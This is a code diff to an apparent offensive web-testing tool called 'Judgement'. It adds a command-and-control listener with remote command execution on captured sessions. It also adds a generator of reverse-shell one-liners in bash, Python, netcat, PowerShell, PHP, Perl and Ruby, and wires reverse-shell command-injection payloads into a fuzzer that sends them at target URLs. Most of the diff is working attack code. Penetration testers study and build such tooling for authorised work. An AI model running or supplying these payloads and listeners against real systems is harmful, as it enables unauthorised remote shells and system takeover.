@@ -97,6 +97,15 @@ DEFAULT_CONFIG = {
             "http_header_injection": "payloads/http_header_injection.txt"
         }
     },
+    "villain": {
+        "enabled": True,
+        "default_host": "0.0.0.0",
+        "default_port": 4444,
+        "callback_url": "http://127.0.0.1:4444",
+        "auto_start_listener": True,
+        "evidence_capture": True,
+        "session_timeout": 300
+    },
     "bruteforce": {
         "usernames": "wordlists/usernames.txt",
         "passwords": "wordlists/passwords.txt",
@@ -502,13 +511,367 @@ class SecListsManager:
                         
         return wordlists
 
+class VillainManager:
+    """Villain C2 Framework Integration and Management"""
+    
+    def __init__(self, config, logger):
+        self.config = config
+        self.logger = logger
+        self.listeners = {}
+        self.active_sessions = {}
+        self.evidence_capture = EvidenceCapture(logger)
+        self.listener_port = config.get("villain", {}).get("default_port", 4444)
+        self.listener_host = config.get("villain", {}).get("default_host", "0.0.0.0")
+        self.callback_url = config.get("villain", {}).get("callback_url", f"http://127.0.0.1:{self.listener_port}")
+        self._initialize_villain()
+        
+    def _initialize_villain(self):
+        """Initialize Villain C2 framework"""
+        self.logger.log("Initializing Villain C2 framework...")
+        
+        # Create villain directory structure
+        os.makedirs("villain", exist_ok=True)
+        os.makedirs("villain/payloads", exist_ok=True)
+        os.makedirs("villain/listeners", exist_ok=True)
+        os.makedirs("villain/sessions", exist_ok=True)
+        os.makedirs("villain/evidence", exist_ok=True)
+        
+    def start_listener(self, port=None, interface="0.0.0.0"):
+        """Start a Villain listener"""
+        if port is None:
+            port = self.listener_port
+            
+        listener_id = f"listener_{port}_{int(time.time())}"
+        
+        try:
+            # Create listener thread
+            listener_thread = threading.Thread(
+                target=self._listener_worker,
+                args=(listener_id, interface, port),
+                daemon=True
+            )
+            listener_thread.start()
+            
+            self.listeners[listener_id] = {
+                "id": listener_id,
+                "interface": interface,
+                "port": port,
+                "status": "active",
+                "thread": listener_thread,
+                "start_time": datetime.now().isoformat(),
+                "connections": 0
+            }
+            
+            self.logger.log(f"Started Villain listener {listener_id} on {interface}:{port}")
+            return listener_id
+            
+        except Exception as e:
+            self.logger.log(f"Failed to start listener: {e}")
+            return None
+            
+    def _listener_worker(self, listener_id, interface, port):
+        """Listener worker thread"""
+        import socket
+        
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((interface, port))
+            sock.listen(5)
+            
+            self.logger.log(f"Listener {listener_id} waiting for connections on {interface}:{port}")
+            
+            while True:
+                client_socket, client_address = sock.accept()
+                
+                # Update connection count
+                if listener_id in self.listeners:
+                    self.listeners[listener_id]["connections"] += 1
+                
+                # Handle new session
+                session_id = self._handle_new_session(client_socket, client_address, listener_id)
+                self.logger.log(f"New session {session_id} from {client_address[0]}:{client_address[1]}")
+                
+        except Exception as e:
+            self.logger.log(f"Listener {listener_id} error: {e}")
+            
+    def _handle_new_session(self, client_socket, client_address, listener_id):
+        """Handle new incoming session"""
+        session_id = f"session_{int(time.time())}_{random.randint(1000, 9999)}"
+        
+        session_info = {
+            "id": session_id,
+            "listener_id": listener_id,
+            "client_ip": client_address[0],
+            "client_port": client_address[1],
+            "start_time": datetime.now().isoformat(),
+            "status": "active",
+            "socket": client_socket,
+            "commands_executed": [],
+            "evidence": []
+        }
+        
+        self.active_sessions[session_id] = session_info
+        
+        # Start session handler thread
+        session_thread = threading.Thread(
+            target=self._session_handler,
+            args=(session_id, client_socket),
+            daemon=True
+        )
+        session_thread.start()
+        
+        # Capture evidence of new connection
+        self.evidence_capture.capture_connection(session_info)
+        
+        return session_id
+        
+    def _session_handler(self, session_id, client_socket):
+        """Handle individual session communications"""
+        try:
+            # Send initial identification
+            client_socket.send(b"Judgement C2 - Session Established\n")
+            
+            while True:
+                # Simple command interface
+                try:
+                    client_socket.settimeout(30)
+                    data = client_socket.recv(1024)
+                    
+                    if not data:
+                        break
+                        
+                    command_output = data.decode('utf-8', errors='ignore').strip()
+                    
+                    if command_output:
+                        # Log command execution
+                        command_info = {
+                            "timestamp": datetime.now().isoformat(),
+                            "output": command_output,
+                            "size": len(command_output)
+                        }
+                        
+                        if session_id in self.active_sessions:
+                            self.active_sessions[session_id]["commands_executed"].append(command_info)
+                            
+                        # Capture evidence
+                        self.evidence_capture.capture_command_execution(session_id, command_info)
+                        
+                        self.logger.log(f"Session {session_id} command output: {command_output[:100]}...")
+                        
+                except socket.timeout:
+                    continue
+                except Exception as e:
+                    self.logger.log(f"Session {session_id} communication error: {e}")
+                    break
+                    
+        except Exception as e:
+            self.logger.log(f"Session {session_id} handler error: {e}")
+        finally:
+            self._cleanup_session(session_id)
+            
+    def _cleanup_session(self, session_id):
+        """Clean up session resources"""
+        if session_id in self.active_sessions:
+            session = self.active_sessions[session_id]
+            try:
+                session["socket"].close()
+            except:
+                pass
+            session["status"] = "closed"
+            session["end_time"] = datetime.now().isoformat()
+            
+            # Generate final evidence report
+            self.evidence_capture.generate_session_report(session_id, session)
+            
+    def generate_callback_payloads(self, payload_type="bash"):
+        """Generate callback payloads for various exploit types"""
+        payloads = {}
+        host = self.callback_url.split('://')[1].split(':')[0]
+        port = self.listener_port
+        
+        # Basic reverse shell payloads
+        if payload_type == "bash":
+            payloads["bash_tcp"] = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
+            payloads["bash_tcp_alt"] = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
+            payloads["bash_tcp_encoded"] = f"echo 'bash -i >& /dev/tcp/{host}/{port} 0>&1' | base64 -d | bash"
+            
+        elif payload_type == "python":
+            payloads["python_tcp"] = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+            payloads["python3_tcp"] = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+            
+        elif payload_type == "nc":
+            payloads["nc_tcp"] = f"nc -e /bin/sh {host} {port}"
+            payloads["nc_tcp_alt"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
+            payloads["ncat_tcp"] = f"ncat {host} {port} -e /bin/sh"
+            
+        elif payload_type == "powershell":
+            payloads["powershell_tcp"] = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
+            
+        elif payload_type == "php":
+            payloads["php_tcp"] = f"""php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
+            payloads["php_tcp_alt"] = f"""php -r '$sock=fsockopen("{host}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
+            
+        elif payload_type == "perl":
+            payloads["perl_tcp"] = f"""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
+            
+        elif payload_type == "ruby":
+            payloads["ruby_tcp"] = f"""ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+            
+        return payloads
+        
+    def get_active_listeners(self):
+        """Get information about active listeners"""
+        return self.listeners
+        
+    def get_active_sessions(self):
+        """Get information about active sessions"""
+        return self.active_sessions
+        
+    def stop_listener(self, listener_id):
+        """Stop a specific listener"""
+        if listener_id in self.listeners:
+            self.listeners[listener_id]["status"] = "stopped"
+            self.logger.log(f"Stopped listener {listener_id}")
+            return True
+        return False
+        
+    def execute_command_on_session(self, session_id, command):
+        """Execute command on active session"""
+        if session_id in self.active_sessions:
+            session = self.active_sessions[session_id]
+            try:
+                session["socket"].send((command + "\n").encode())
+                return True
+            except Exception as e:
+                self.logger.log(f"Failed to execute command on session {session_id}: {e}")
+        return False
+
+
+class EvidenceCapture:
+    """Evidence capture and documentation system"""
+    
+    def __init__(self, logger):
+        self.logger = logger
+        self.evidence_dir = "villain/evidence"
+        os.makedirs(self.evidence_dir, exist_ok=True)
+        
+    def capture_connection(self, session_info):
+        """Capture evidence of new connection"""
+        evidence_file = os.path.join(self.evidence_dir, f"connection_{session_info['id']}.json")
+        
+        evidence = {
+            "type": "connection_established",
+            "timestamp": session_info["start_time"],
+            "session_id": session_info["id"],
+            "source_ip": session_info["client_ip"],
+            "source_port": session_info["client_port"],
+            "listener_id": session_info["listener_id"]
+        }
+        
+        try:
+            with open(evidence_file, 'w') as f:
+                json.dump(evidence, f, indent=2)
+            self.logger.log(f"Captured connection evidence: {evidence_file}")
+        except Exception as e:
+            self.logger.log(f"Failed to capture connection evidence: {e}")
+            
+    def capture_command_execution(self, session_id, command_info):
+        """Capture evidence of command execution"""
+        evidence_file = os.path.join(self.evidence_dir, f"commands_{session_id}.json")
+        
+        # Load existing evidence or create new
+        try:
+            if os.path.exists(evidence_file):
+                with open(evidence_file, 'r') as f:
+                    evidence_data = json.load(f)
+            else:
+                evidence_data = {
+                    "type": "command_execution_log",
+                    "session_id": session_id,
+                    "commands": []
+                }
+                
+            evidence_data["commands"].append(command_info)
+            
+            with open(evidence_file, 'w') as f:
+                json.dump(evidence_data, f, indent=2)
+                
+        except Exception as e:
+            self.logger.log(f"Failed to capture command evidence: {e}")
+            
+    def generate_session_report(self, session_id, session_data):
+        """Generate comprehensive session report"""
+        report_file = os.path.join(self.evidence_dir, f"session_report_{session_id}.html")
+        
+        html_content = f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Session Report - {session_id}</title>
+            <style>
+                body {{ font-family: Arial, sans-serif; margin: 20px; }}
+                .header {{ background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
+                .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
+                .command {{ background-color: #f8f9fa; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; }}
+                .timestamp {{ color: #6c757d; font-size: 0.9em; }}
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h1>Judgement C2 Session Report</h1>
+                <p>Session ID: {session_id}</p>
+                <p>Generated: {datetime.now().isoformat()}</p>
+            </div>
+            
+            <div class="section">
+                <h2>Session Information</h2>
+                <p><strong>Client IP:</strong> {session_data.get('client_ip', 'N/A')}</p>
+                <p><strong>Client Port:</strong> {session_data.get('client_port', 'N/A')}</p>
+                <p><strong>Start Time:</strong> {session_data.get('start_time', 'N/A')}</p>
+                <p><strong>End Time:</strong> {session_data.get('end_time', 'N/A')}</p>
+                <p><strong>Status:</strong> {session_data.get('status', 'N/A')}</p>
+                <p><strong>Listener ID:</strong> {session_data.get('listener_id', 'N/A')}</p>
+            </div>
+            
+            <div class="section">
+                <h2>Command Execution Log</h2>
+        """
+        
+        commands = session_data.get('commands_executed', [])
+        if commands:
+            for cmd in commands:
+                html_content += f"""
+                <div class="command">
+                    <div class="timestamp">{cmd.get('timestamp', 'N/A')}</div>
+                    <pre>{cmd.get('output', 'N/A')}</pre>
+                </div>
+                """
+        else:
+            html_content += "<p>No commands executed during this session.</p>"
+            
+        html_content += """
+            </div>
+        </body>
+        </html>
+        """
+        
+        try:
+            with open(report_file, 'w') as f:
+                f.write(html_content)
+            self.logger.log(f"Generated session report: {report_file}")
+        except Exception as e:
+            self.logger.log(f"Failed to generate session report: {e}")
+
+
 class PayloadGenerator:
     """Advanced payload generation with SecLists integration"""
     
-    def __init__(self, config, logger, seclists_manager):
+    def __init__(self, config, logger, seclists_manager, villain_manager=None):
         self.config = config
         self.logger = logger
         self.seclists_manager = seclists_manager
+        self.villain_manager = villain_manager
         self.payloads = {}
         self._initialize_payloads()
         
@@ -529,10 +892,52 @@ class PayloadGenerator:
                 self.payloads[category] = payloads
                 self.logger.log(f"Generated {len(payloads)} {category} payloads")
                 
+        # Generate callback payloads if Villain is enabled
+        if self.villain_manager and self.config.get("villain", {}).get("enabled", False):
+            self._generate_callback_payloads()
+                
+    def _generate_callback_payloads(self):
+        """Generate callback payloads that connect back to Villain listeners"""
+        self.logger.log("Generating callback payloads for Villain C2...")
+        
+        callback_categories = ["bash", "python", "nc", "powershell", "php", "perl", "ruby"]
+        
+        for payload_type in callback_categories:
+            callback_payloads = self.villain_manager.generate_callback_payloads(payload_type)
+            
+            if callback_payloads:
+                # Save callback payloads to files
+                callback_file = f"payloads/callback_{payload_type}.txt"
+                os.makedirs(os.path.dirname(callback_file), exist_ok=True)
+                
+                with open(callback_file, 'w') as f:
+                    for payload_name, payload_content in callback_payloads.items():
+                        f.write(f"# {payload_name}\n{payload_content}\n\n")
+                
+                self.payloads[f"callback_{payload_type}"] = list(callback_payloads.values())
+                self.logger.log(f"Generated {len(callback_payloads)} {payload_type} callback payloads")
+                
+    def get_callback_payloads(self, payload_type="all"):
+        """Get callback payloads for injection into exploits"""
+        if payload_type == "all":
+            all_callbacks = {}
+            for key, payloads in self.payloads.items():
+                if key.startswith("callback_"):
+                    all_callbacks[key] = payloads
+            return all_callbacks
+        else:
+            return self.payloads.get(f"callback_{payload_type}", [])
+                
     def _generate_payloads(self, category):
         """Generate payloads for a specific category"""
-        # In a real implementation, this would pull from SecLists
-        # For demo, we'll create comprehensive payloads
+        # Get callback host and port for reverse shell payloads
+        callback_host = "127.0.0.1"
+        callback_port = "4444"
+        
+        if self.villain_manager:
+            callback_host = self.villain_manager.callback_url.split('://')[1].split(':')[0]
+            callback_port = str(self.villain_manager.listener_port)
+        
         payload_data = {
             "sql_injection": [
                 "' OR '1'='1", 
@@ -858,12 +1263,24 @@ class PayloadGenerator:
                 "&& msfconsole",
                 "`msfconsole`",
                 "$(msfconsole)",
-                "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-                "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-                "& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-                "&& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-                "`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`",
-                "$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')"
+                "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                "& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                "&& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                "`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`",
+                "$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')",
+                "; bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1",
+                "| bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1",
+                "& bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1",
+                "&& bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1",
+                "`bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1`",
+                "$(bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1)",
+                "; nc -e /bin/sh " + callback_host + " " + callback_port,
+                "| nc -e /bin/sh " + callback_host + " " + callback_port,
+                "& nc -e /bin/sh " + callback_host + " " + callback_port,
+                "&& nc -e /bin/sh " + callback_host + " " + callback_port,
+                "`nc -e /bin/sh " + callback_host + " " + callback_port + "`",
+                "$(nc -e /bin/sh " + callback_host + " " + callback_port + ")"
             ],
             "ssti": [
                 "{{7*7}}",
@@ -1858,6 +2275,14 @@ class AdvancedFuzzer:
         self.found_items = Queue()
         self.scan_depth = config["scanning"]["depth"]
         self.scan_id = f"fuzz_{int(time.time())}"
+        self.callback_mode = False
+        self.villain_manager = None
+        
+    def enable_callback_mode(self, villain_manager):
+        """Enable callback mode for C2 integration"""
+        self.callback_mode = True
+        self.villain_manager = villain_manager
+        self.logger.log("Callback mode enabled for fuzzing")
         
     def fuzz_directories(self, base_url, wordlist=None, extensions=None):
         """Fuzz directories and files with advanced scanning"""
@@ -2026,10 +2451,20 @@ class AdvancedFuzzer:
         crlf_payloads = self.payload_generator.get_payloads("crlf_injection")
         header_payloads = self.payload_generator.get_payloads("http_header_injection")
         
+        # Add callback payloads if in callback mode
+        callback_payloads = []
+        if self.callback_mode and self.villain_manager:
+            self.logger.log("Including callback payloads for C2 integration")
+            all_callback_payloads = self.payload_generator.get_callback_payloads("all")
+            # Flatten callback payloads
+            for payload_type, payloads in all_callback_payloads.items():
+                callback_payloads.extend(payloads)
+        
         # Combine all payloads
         all_payloads = (sql_payloads + xss_payloads + cmd_payloads + ssti_payloads + 
                        pt_payloads + xxe_payloads + ssrf_payloads + ldap_payloads + 
-                       nosql_payloads + xpath_payloads + crlf_payloads + header_payloads)
+                       nosql_payloads + xpath_payloads + crlf_payloads + header_payloads + 
+                       callback_payloads)
         
         # Adjust scan depth
         if self.scan_depth == "quick":
@@ -2547,17 +2982,28 @@ class ReportGenerator:
 class JudgementOrchestrator:
     """Orchestrator for intelligent chaining of all components"""
     
-    def __init__(self, config, logger, db_manager, wordlist_manager, payload_generator):
+    def __init__(self, config, logger, db_manager, wordlist_manager, payload_generator, villain_manager=None):
         self.config = config
         self.logger = logger
         self.db_manager = db_manager
         self.wordlist_manager = wordlist_manager
         self.payload_generator = payload_generator
+        self.villain_manager = villain_manager
         self.reporter = ReportGenerator(logger, db_manager)
+        self.active_listener_id = None
         
     def run_intelligent_assessment(self, initial_target):
-        """Run a full intelligent security assessment"""
+        """Run a full intelligent security assessment with Villain C2 integration"""
         self.logger.log(f"Starting intelligent security assessment on {initial_target}")
+        
+        # Auto-start Villain listener if enabled
+        if self.villain_manager and self.config.get("villain", {}).get("auto_start_listener", False):
+            self.logger.log("[VILLAIN] Starting C2 listener...")
+            self.active_listener_id = self.villain_manager.start_listener()
+            if self.active_listener_id:
+                self.logger.log(f"[VILLAIN] Listener {self.active_listener_id} active")
+            else:
+                self.logger.log("[VILLAIN] Failed to start listener", "ERROR")
         
         # Phase 1: Target Discovery
         self.logger.log("[PHASE 1] Target Discovery")
@@ -2619,12 +3065,19 @@ class JudgementCLI:
         
         # Initialize components
         self.seclists_manager = SecListsManager(self.config, self.logger)
+        
+        # Initialize Villain C2 manager if enabled
+        self.villain_manager = None
+        if self.config.get("villain", {}).get("enabled", False):
+            self.villain_manager = VillainManager(self.config, self.logger)
+            self.logger.log("Villain C2 framework initialized")
+        
         self.wordlist_manager = WordlistManager(self.config, self.logger, self.seclists_manager)
-        self.payload_generator = PayloadGenerator(self.config, self.logger, self.seclists_manager)
+        self.payload_generator = PayloadGenerator(self.config, self.logger, self.seclists_manager, self.villain_manager)
         self.reporter = ReportGenerator(self.logger, self.db_manager)
         self.orchestrator = JudgementOrchestrator(
             self.config, self.logger, self.db_manager, 
-            self.wordlist_manager, self.payload_generator
+            self.wordlist_manager, self.payload_generator, self.villain_manager
         )
         
     def show_banner(self):
@@ -2660,8 +3113,9 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         menu.add("[6] Full Intelligent Assessment")
         menu.add("[7] View Reports")
         menu.add("[8] View Vulnerable Fields")
-        menu.add("[9] Configuration")
-        menu.add("[10] Exit")
+        menu.add("[9] Villain C2 Management")
+        menu.add("[10] Configuration")
+        menu.add("[11] Exit")
         self.console.print(menu)
         
     def config_menu(self):
@@ -2672,7 +3126,8 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         menu.add("[3] Timeout (Current: {})".format(self.config["timeout"]))
         menu.add("[4] Delay (Current: {})".format(self.config["delay"]))
         menu.add("[5] Reporting Format (Current: {})".format(self.config["reporting"]["format"]))
-        menu.add("[6] Back to Main Menu")
+        menu.add("[6] Villain C2 Settings (Enabled: {})".format(self.config.get("villain", {}).get("enabled", False)))
+        menu.add("[7] Back to Main Menu")
         self.console.print(menu)
         
     def reports_menu(self):
@@ -2697,7 +3152,7 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         
         while True:
             self.main_menu()
-            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"])
+            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"])
             
             if choice == "1":
                 self.target_discovery()
@@ -2716,8 +3171,10 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
             elif choice == "8":
                 self.view_vuln_fields()
             elif choice == "9":
-                self.configuration()
+                self.villain_management()
             elif choice == "10":
+                self.configuration()
+            elif choice == "11":
                 self.console.print("[bold green]Exiting Judgement. Happy hunting![/bold green]")
                 break
                 
@@ -2803,8 +3260,32 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         target = Prompt.ask("Enter target URL")
         if not target.startswith(("http://", "https://")):
             target = "http://" + target
+        
+        # Option to include callback payloads
+        use_callbacks = False
+        if self.villain_manager:
+            use_callbacks = Confirm.ask("Include callback payloads for C2 integration?", default=False)
+            
+            if use_callbacks:
+                # Auto-start listener if not already running
+                active_listeners = self.villain_manager.get_active_listeners()
+                if not active_listeners:
+                    self.console.print("[yellow]No active listeners found. Starting default listener...[/yellow]")
+                    listener_id = self.villain_manager.start_listener()
+                    if listener_id:
+                        self.console.print(f"[green]Started listener {listener_id}[/green]")
+                    else:
+                        self.console.print("[red]Failed to start listener[/red]")
+                        use_callbacks = False
+                else:
+                    self.console.print(f"[green]Using existing listeners: {list(active_listeners.keys())}[/green]")
             
         fuzzer = AdvancedFuzzer(self.config, self.logger, self.wordlist_manager, self.payload_generator, self.db_manager)
+        
+        # Set callback mode if enabled
+        if use_callbacks:
+            fuzzer.enable_callback_mode(self.villain_manager)
+            
         results = fuzzer.fuzz_parameters(target)
         
         if results:
@@ -2829,6 +3310,16 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
                     vulns
                 )
             self.console.print(table)
+            
+            # Show callback status if enabled
+            if use_callbacks:
+                sessions = self.villain_manager.get_active_sessions()
+                if sessions:
+                    self.console.print(f"\n[bold green]C2 Sessions Established: {len(sessions)}[/bold green]")
+                    for session_id, info in sessions.items():
+                        self.console.print(f"  Session {session_id}: {info.get('client_ip', 'N/A')}")
+                else:
+                    self.console.print("\n[yellow]No C2 sessions established yet[/yellow]")
         else:
             self.console.print("[yellow]No vulnerabilities found[/yellow]")
             
@@ -2872,6 +3363,17 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         target = Prompt.ask("Enter initial target URL")
         if not target.startswith(("http://", "https://")):
             target = "http://" + target
+        
+        # Villain C2 integration prompt
+        use_villain = False
+        if self.villain_manager:
+            use_villain = Confirm.ask("Enable Villain C2 integration for this assessment?", default=True)
+            if use_villain:
+                self.console.print("[green]Assessment will include C2 callback payloads and automatic listener management[/green]")
+        else:
+            villain_prompt = Confirm.ask("Villain C2 is not enabled. Would you like to enable it for advanced callback payloads?", default=False)
+            if villain_prompt:
+                self.console.print("[yellow]Please configure Villain C2 in the Configuration menu first[/yellow]")
             
         results = self.orchestrator.run_intelligent_assessment(target)
         
@@ -2882,6 +3384,17 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         self.console.print(f"Parameter findings: {len(results['parameter_findings'])}")
         self.console.print(f"Brute force results: {len(results['bruteforce_results'])}")
         self.console.print(f"Report saved to: {results['report']}")
+        
+        # Show C2 results if Villain was used
+        if use_villain and self.villain_manager:
+            sessions = self.villain_manager.get_active_sessions()
+            if sessions:
+                self.console.print(f"\n[bold green]C2 Sessions Established: {len(sessions)}[/bold green]")
+                for session_id, info in sessions.items():
+                    self.console.print(f"  Session {session_id}: {info.get('client_ip', 'N/A')} (Commands: {len(info.get('commands_executed', []))})")
+                self.console.print("\n[cyan]Use 'Villain C2 Management' menu to interact with sessions[/cyan]")
+            else:
+                self.console.print("\n[yellow]No C2 sessions established during assessment[/yellow]")
         
     def view_reports(self):
         """View and manage reports"""
@@ -2961,11 +3474,225 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         else:
             self.console.print("[yellow]No vulnerable fields found[/yellow]")
             
+    def villain_management(self):
+        """Manage Villain C2 framework"""
+        if not self.villain_manager:
+            self.console.print("[red]Villain C2 framework is not enabled[/red]")
+            self.console.print("Enable it in configuration to use C2 features.")
+            return
+            
+        while True:
+            self.console.print("\n[bold blue]Villain C2 Management[/bold blue]")
+            
+            villain_menu = Tree("[bold blue]Villain C2 Menu[/bold blue]")
+            villain_menu.add("[1] Start Listener")
+            villain_menu.add("[2] View Active Listeners")
+            villain_menu.add("[3] View Active Sessions")
+            villain_menu.add("[4] Generate Callback Payloads")
+            villain_menu.add("[5] Execute Command on Session")
+            villain_menu.add("[6] View Evidence")
+            villain_menu.add("[7] Stop Listener")
+            villain_menu.add("[8] Back to Main Menu")
+            self.console.print(villain_menu)
+            
+            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8"])
+            
+            if choice == "1":
+                self._start_listener()
+            elif choice == "2":
+                self._view_listeners()
+            elif choice == "3":
+                self._view_sessions()
+            elif choice == "4":
+                self._generate_callback_payloads()
+            elif choice == "5":
+                self._execute_command_on_session()
+            elif choice == "6":
+                self._view_evidence()
+            elif choice == "7":
+                self._stop_listener()
+            elif choice == "8":
+                break
+                
+    def _start_listener(self):
+        """Start a new Villain listener"""
+        port = Prompt.ask("Enter listener port", default=str(self.villain_manager.listener_port))
+        interface = Prompt.ask("Enter interface", default="0.0.0.0")
+        
+        try:
+            port = int(port)
+            listener_id = self.villain_manager.start_listener(port, interface)
+            
+            if listener_id:
+                self.console.print(f"[green]Listener {listener_id} started on {interface}:{port}[/green]")
+            else:
+                self.console.print("[red]Failed to start listener[/red]")
+        except ValueError:
+            self.console.print("[red]Invalid port number[/red]")
+            
+    def _view_listeners(self):
+        """View active listeners"""
+        listeners = self.villain_manager.get_active_listeners()
